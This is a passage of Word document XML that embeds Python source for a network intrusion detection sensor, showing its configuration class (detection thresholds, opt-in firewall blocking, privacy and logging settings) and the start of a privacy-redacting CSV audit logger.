    </w:p>
    <w:p w14:paraId="5EDDFC3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self.ddos_consecutive_intervals = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0522CC3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self.knn_k = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2302015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self.kmeans_k = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFA8E3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self.kmeans_alpha = 0.05</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2EE0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self.payload_confidence = 0.80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A74AAE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self.alert_dedup_seconds = 5.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CCC0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Interval detections may only name/block a source when one address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FA0A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accounts for at least this share of the observed packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="207C9F6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self.source_attribution_min_share = 0.50</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FD13B4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72E9CA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NFR-3: active defence is OPT-IN, never on by default ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1B3E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self.block_enabled = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="463091E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self.block_whitelist = ["127.0.0.1", "0.0.0.0"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5059B3D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which engines are allowed to trigger a firewall drop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C551B0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self.block_on = ["payload", "blacklist", "ddos", "scan"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FB49F8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E5161D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NFR-3 / GDPR + DPA 2018 ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23228E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self.payload_excerpt_bytes = 64   # truncate stored payload excerpts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAE98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self.privacy_mode = True          # redact PII + anonymise IPs in logs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6821166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self.anonymise_ips = False        # mask last octet in persisted logs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58661C5A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="605A90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telemetry ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D739AB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self.udp_host = "127.0.0.1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270430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self.udp_port = 9999</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C7A7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self.http_port = 8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145EAF07" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F6D54F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threat intelligence ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7061752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self.blacklist_file = None        # newline separated IP feed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D72D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self.bloom_size = 1000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0AE80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self.bloom_hashes = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C74D83F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6998B21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forensics ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F507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self.pcap_file = None             # if set, write a live libpcap capture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503EEF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self.pcap_snaplen = 96            # headers only by default (privacy)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196ACC39" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31295A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self.brain_file = "data/mantis_brain.json"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A86CDF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self.log_file = "mantis_logs.csv"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40988A1F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36F797B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loading -------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5384E44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load_file(self, path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3687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path or not os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430A87C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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060721C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open(path, "r", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA886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data = json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4710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self.update(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574FFB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config loaded from %s" % path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3262D10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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FA96F3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F7D96B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load_env(self, environ=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="600C757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"""Read MANTIS_* environment variables (MANTIS_BLOCK_ENABLED=1)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59029DB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environ = environ if environ is not None else os.environ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546A10C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for key in vars(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0412C0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env_key = "MANTIS_" + key.upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E715FF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env_key in environ:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E7AC3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self._set_coerced(key, environ[env_key])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B44165" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C3D6C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update(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B72760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isinstance(data, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2128149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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19AA912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key, value in data.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8ED2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hasattr(self, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654033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setattr(self, key, value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF589CB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68B41BA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_set_coerced(self, key, raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609650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"""Coerce a string (env var / CLI) to the type of the default."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A4C99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current = getattr(self, key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D678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23DF6D7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isinstance(current, bool):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7863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setattr(self, key, str(raw).strip().lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8A932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in ("1", "true", "yes", "on"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453C96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elif isinstance(current, int):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4066FA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setattr(self, key, int(raw))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49AF804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elif isinstance(current, float):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDA0C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setattr(self, key, float(raw))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0415AE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elif isinstance(current, list):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED0584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setattr(self, key, [p.strip() for p in str(raw).split(",")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D81BE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p.strip()])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B31A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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0E5E7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setattr(self, key, raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4A49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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FA55C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ignoring bad config value for %s: %r" % (key, raw))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B8C55F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6378BBC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apply_args(self, args):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C9B61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"""Apply parsed argparse values (None means 'not supplied')."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5A50B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key, value in vars(args).items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D657B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value is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEFD0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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2E54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hasattr(self, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55776A4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setattr(self, key, value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6134F5AA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47C16CB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as_dict(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6274D9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dict(vars(self))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CD1ECC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53234B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summary(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C22D36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"""Short human-readable banner used at sensor start-up."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F15CA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"\n".join([</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72074CE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interface        : %s" % self.interface,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1ED63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packet buffer    : %d packets (in-memory)" % self.packet_buffer,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430C1BB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z-score / DDoS   : window=%d threshold=%.1f min_pps=%d "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428F6C3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"consecutive=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1337005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(self.zscore_window, self.zscore_threshold, self.ddos_min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4015410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self.ddos_consecutive_intervals),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6C9C9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knn / kmeans     : k=%d / k=%d alpha=%.2f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BEEC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(self.knn_k, self.kmeans_k, self.kmeans_alpha),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E900A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source attribution: minimum %.0f%% dominant traffic share"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DFA0A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(self.source_attribution_min_share * 100),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C22ABB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active defence   : %s%s" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69215F4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"ENABLED" if self.block_enabled else "disabled (opt-in)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4051B0B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on " + ",".join(self.block_on)) if self.block_enabled else ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F528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privacy mode     : %s (payload excerpt %d bytes)" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1023B1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"on" if self.privacy_mode else "off",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444F0B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self.payload_excerpt_bytes),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277006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pcap capture     : %s" % (self.pcap_file or "off"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA6B11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threat intel     : %s" % (self.blacklist_file or "built-in seed"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E5A30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CAC99FC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="349C5335" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C30D9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module-level singleton shared by every component</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29043F9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CONFIG = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2308323D"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src/utils/logger.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7C1259" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>167 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED89F0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csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275A6A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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B3790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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A35D50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socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3B750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threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0603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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C53EA0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="710080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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5C07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import utils.mitre as mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5495F7E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import utils.privacy as privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185342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except ImportError:  # direct execution from inside utils/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D23CD2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import mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7182460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import privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC66EB7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30921E0D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70979B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FR-4 requires the audit trail to record "timestamps, source IP addresses,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033D57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engine identifiers, threat verdicts, confidence scores, and payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634FE75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excerpts", not just a free-text line. These are the resulting columns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6B8A7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CSV_COLUMNS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AAEF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"Timestamp",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B7165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"Source IP",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E15D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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB9AE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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2774CF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"Severity",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4739513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"Risk Score",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEC823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"Confidence",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184D5C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"ATT&amp;CK Technique",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD96B2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"ATT&amp;CK Tactic",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F097D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"Payload Excerpt",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FD5F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"Message",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1450453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667CF705" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="631D6E0E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B13F6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Logger:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F245B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"""Append-only CSV audit log.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3469579F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="485335F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Writes are serialised through a threading.Lock because the sensor's</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B494DD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analyzer thread and the main reporting loop can both emit an alert; without</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063B410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it two interleaved csv.writer calls can produce a torn row and corrupt the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A39F41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evidence file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C570F8C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02FC2FE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Everything persisted here passes through utils.privacy first, so the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC558D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64-byte excerpt limit and PII redaction required by NFR-3 are enforced at</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70ED763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the point of writing rather than left to each caller.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DBF09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0AACDDD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63A889C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__init__(self, filename="mantis_logs.csv", config=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BA5F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self.filename = filename</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF8150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self.config = config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4B83E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self._lock = threading.Lock()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B11523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self.rows_written = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="628C2BD9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="367B074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(Re)create the header when the file is absent or was left empty.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D2709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needs_header = (not os.path.exists(self.filename)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C36A6E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or os.path.getsize(self.filename) == 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AEA9E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needs_header:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B94B5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open(self.filename, "w", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698C914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csv.writer(f).writerow(CSV_COLUMNS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50ADA1D0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="302586A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log_alert(self, message, src_ip=None, engine=None, confidence=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAC53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payload=None, verdict=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30148E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"""Record one alert, enriched with ATT&amp;CK context and risk score."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FAC1B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meta = mitre.enrich(message, confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289B29D2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63A0380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limit = getattr(self.config, "payload_excerpt_bytes", 64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14923D1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privacy_mode = getattr(self.config, "privacy_mode", True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493F29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anonymise = getattr(self.config, "anonymise_ips", False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1726D9AE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4879B0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excerpt = privacy.payload_excerpt(payload, limit=limit,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F645D6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privacy_mode=privacy_mode) if payload else ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48613C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safe_ip = privacy.anonymise_ip(src_ip, anonymise) if src_ip else ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5553FD44" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1227ED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row = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D3D76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time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FAB6A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safe_ip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223DD5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 or meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392C9A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 or meta["kind"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F20BAF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meta["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B0DE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meta["risk_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5500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if confidence is None else round(float(confidence), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F4040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 (%s)" % (meta["technique_id"], meta["technique"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4C5AC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 (%s)" % (meta["tactic_id"], meta["tactic"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1843B8B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excerpt,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791253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privacy.redact(message) if privacy_mode else message,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F20A56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275678F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D12B35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3175E02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self._lock:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1224F4B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open(self.filename, "a", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECCBA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csv.writer(f).writerow(row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2D6F3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self.rows_written += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0FA65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Exception as e:</w:t>
      </w:r>
    </w:p>
